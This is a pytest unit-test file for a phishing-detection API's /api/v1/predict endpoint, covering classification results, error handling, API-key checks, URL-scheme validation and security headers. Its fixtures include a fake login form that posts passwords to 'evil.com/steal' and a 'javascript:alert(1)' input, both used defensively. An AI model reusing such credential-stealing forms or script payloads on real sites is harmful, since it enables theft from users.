"""
Unit tests for POST /api/v1/predict endpoint.

The ML predictor is mocked via conftest.py fixtures so tests are fast
and do not require the model files to be present.
"""

import pytest
from unittest.mock import MagicMock

from tests.conftest import MOCK_BENIGN_RESULT, MOCK_PHISHING_RESULT
import app.services.ml_predictor as ml_predictor_module


# ---------------------------------------------------------------------------
# Happy-path tests
# ---------------------------------------------------------------------------


def test_predict_phishing_url(client, mock_predictor):
    """A URL classified as phishing returns phishing=True with correct fields."""
    mock_predictor.predict.return_value = MOCK_PHISHING_RESULT.copy()

    resp = client.post("/api/v1/predict", json={"url": "http://totally-legit-login.xyz/secure"})

    assert resp.status_code == 200
    body = resp.json()
    assert body["phishing"] is True
    assert body["threat_type"] == "phishing"
    assert body["label"] == 1
    assert 0.0 <= body["confidence"] <= 1.0
    # Features are hidden by default (FIND-009: prevent info leakage)
    assert body["features"] is None


def test_predict_benign_url(client, mock_predictor):
    """A URL classified as benign returns phishing=False."""
    mock_predictor.predict.return_value = MOCK_BENIGN_RESULT.copy()

    resp = client.post("/api/v1/predict", json={"url": "https://www.google.com"})

    assert resp.status_code == 200
    body = resp.json()
    assert body["phishing"] is False
    assert body["threat_type"] == "benign"
    assert body["label"] == 0


def test_predict_malware_url(client, mock_predictor):
    """A URL classified as malware returns phishing=True, threat_type=malware."""
    mock_predictor.predict.return_value = {
        "phishing": True,
        "confidence": 0.87,
        "label": 2,
        "threat_type": "malware",
        "features": {},
    }

    resp = client.post("/api/v1/predict", json={"url": "http://malware-drop.ru/payload.exe"})

    assert resp.status_code == 200
    body = resp.json()
    assert body["phishing"] is True
    assert body["threat_type"] == "malware"
    assert body["label"] == 2


def test_predict_spam_url(client, mock_predictor):
    """A URL classified as spam returns phishing=True, threat_type=spam."""
    mock_predictor.predict.return_value = {
        "phishing": True,
        "confidence": 0.78,
        "label": 3,
        "threat_type": "spam",
        "features": {},
    }

    resp = client.post("/api/v1/predict", json={"url": "http://cheap-pills-shop.biz/order"})

    assert resp.status_code == 200
    body = resp.json()
    assert body["phishing"] is True
    assert body["threat_type"] == "spam"
    assert body["label"] == 3


def test_predict_response_schema(client, mock_predictor):
    """Response always contains all required fields."""
    mock_predictor.predict.return_value = MOCK_PHISHING_RESULT.copy()

    resp = client.post("/api/v1/predict", json={"url": "http://example.com"})

    body = resp.json()
    required_fields = {"phishing", "confidence", "label", "threat_type"}
    assert required_fields.issubset(body.keys())


def test_predict_features_are_optional(client, mock_predictor):
    """features field can be None without breaking the schema."""
    mock_predictor.predict.return_value = {
        "phishing": False,
        "confidence": 0.9,
        "label": 0,
        "threat_type": "benign",
        "features": None,
    }

    resp = client.post("/api/v1/predict", json={"url": "https://example.com"})

    assert resp.status_code == 200
    assert resp.json()["features"] is None


# ---------------------------------------------------------------------------
# Error / edge cases
# ---------------------------------------------------------------------------


def test_predict_missing_url_field(client):
    """Request without url field returns 422 Unprocessable Entity."""
    resp = client.post("/api/v1/predict", json={})
    assert resp.status_code == 422


def test_predict_wrong_content_type(client):
    """Non-JSON body returns 422."""
    resp = client.post("/api/v1/predict", content="not-json", headers={"Content-Type": "text/plain"})
    assert resp.status_code in (422, 400)


def test_predict_model_not_loaded(client_no_model):
    """When no predictor is loaded, endpoint returns 503."""
    resp = client_no_model.post("/api/v1/predict", json={"url": "https://example.com"})
    assert resp.status_code == 503
    assert "not loaded" in resp.json()["detail"].lower()


def test_predict_model_raises_exception(client, mock_predictor):
    """If the predictor raises an exception, endpoint returns 500."""
    mock_predictor.predict.side_effect = RuntimeError("inference error")

    resp = client.post("/api/v1/predict", json={"url": "https://example.com"})

    assert resp.status_code == 500
    assert "Prediction failed" in resp.json()["detail"]


def test_predict_predictor_called_with_url(client, mock_predictor):
    """Verifies the predictor receives the URL (with html=None when not provided)."""
    url = "https://suspicious-site.example.com/login?redirect=evil"
    mock_predictor.predict.return_value = MOCK_PHISHING_RESULT.copy()

    client.post("/api/v1/predict", json={"url": url})

    mock_predictor.predict.assert_called_once_with(url, html=None)


def test_predict_with_html_content(client, mock_predictor):
    """When HTML is provided, predictor receives both url and html."""
    url = "https://phish-example.com/login"
    html = "<html><body><form action='http://evil.com/steal'><input type='password'></form></body></html>"
    mock_predictor.predict.return_value = MOCK_PHISHING_RESULT.copy()

    resp = client.post("/api/v1/predict", json={"url": url, "html": html})

    assert resp.status_code == 200
    mock_predictor.predict.assert_called_once_with(url, html=html)


# ---------------------------------------------------------------------------
# Health check (sanity)
# ---------------------------------------------------------------------------


def test_health_check(client):
    resp = client.get("/health")
    assert resp.status_code == 200
    body = resp.json()
    assert body["status"] == "healthy"
    assert "model_loaded" in body


# ---------------------------------------------------------------------------
# Security tests
# ---------------------------------------------------------------------------


def test_predict_no_api_key_returns_401(client_no_model, monkeypatch):
    """Without X-API-Key header, request is rejected when API_KEYS is set."""
    monkeypatch.setattr("app.core.config.settings.API_KEYS", ["secret-key"])
    from fastapi.testclient import TestClient
    from app.main import app
    with TestClient(app) as c:
        resp = c.post("/api/v1/predict", json={"url": "https://example.com"})
        assert resp.status_code == 401


def test_predict_invalid_api_key_returns_403(client_no_model, monkeypatch):
    """Invalid X-API-Key header is rejected."""
    monkeypatch.setattr("app.core.config.settings.API_KEYS", ["secret-key"])
    from fastapi.testclient import TestClient
    from app.main import app
    with TestClient(app) as c:
        c.headers["X-API-Key"] = "wrong-key"
        resp = c.post("/api/v1/predict", json={"url": "https://example.com"})
        assert resp.status_code == 403


def test_predict_invalid_url_format_returns_422(client, mock_predictor):
    """URL without http/https scheme is rejected."""
    resp = client.post("/api/v1/predict", json={"url": "not-a-url"})
    assert resp.status_code == 422


def test_predict_javascript_scheme_rejected(client, mock_predictor):
    """javascript: scheme is rejected."""
    resp = client.post("/api/v1/predict", json={"url": "javascript:alert(1)"})
    assert resp.status_code == 422


def test_predict_data_scheme_rejected(client, mock_predictor):
    """data: scheme is rejected."""
    resp = client.post("/api/v1/predict", json={"url": "data:text/html,<h1>hi</h1>"})
    assert resp.status_code == 422


def test_predict_features_hidden_by_default(client, mock_predictor):
    """Features are not returned unless include_features=True."""
    mock_predictor.predict.return_value = MOCK_PHISHING_RESULT.copy()
    resp = client.post("/api/v1/predict", json={"url": "http://example.com"})
    assert resp.json()["features"] is None


def test_predict_features_visible_when_requested(client, mock_predictor):
    """Features are returned when include_features=True."""
    mock_predictor.predict.return_value = MOCK_PHISHING_RESULT.copy()
    resp = client.post(
        "/api/v1/predict",
        json={"url": "http://example.com"},
        params={"include_features": True},
    )
    assert isinstance(resp.json()["features"], dict)


def test_security_headers_present(client, mock_predictor):
    """Security headers are present in responses."""
    resp = client.get("/health")
    assert resp.headers.get("x-content-type-options") == "nosniff"
    assert resp.headers.get("x-frame-options") == "DENY"
    assert "content-security-policy" in resp.headers
    assert "frame-ancestors 'none'" in resp.headers["content-security-policy"]


# ---------------------------------------------------------------------------
# Shortener analysis field
# ---------------------------------------------------------------------------

def test_predict_shortener_url_includes_shortener_analysis(client, mock_predictor):
    """Shortener URLs include shortener_analysis field in response."""
    mock_predictor.predict.return_value = {
        **MOCK_BENIGN_RESULT,
        "shortener_analysis": {
            "detected": True,
            "final_url": "https://rekrutmen-bi.id/pkwt2026/beranda",
            "hop_count": 1,
            "html_fetched": True,
        },
    }

    resp = client.post("/api/v1/predict", json={"url": "https://bit.ly/4doXuXd"})

    assert resp.status_code == 200
    body = resp.json()
    sa = body.get("shortener_analysis")
    assert sa is not None
    assert sa["detected"] is True
    assert sa["final_url"] == "https://rekrutmen-bi.id/pkwt2026/beranda"
    assert sa["hop_count"] == 1
    assert sa["html_fetched"] is True


def test_predict_non_shortener_url_has_no_shortener_analysis(client, mock_predictor):
    """Non-shortener URLs do not include shortener_analysis field."""
    mock_predictor.predict.return_value = MOCK_BENIGN_RESULT.copy()

    resp = client.post("/api/v1/predict", json={"url": "https://www.google.com"})

    assert resp.status_code == 200
    body = resp.json()
    assert body.get("shortener_analysis") is None

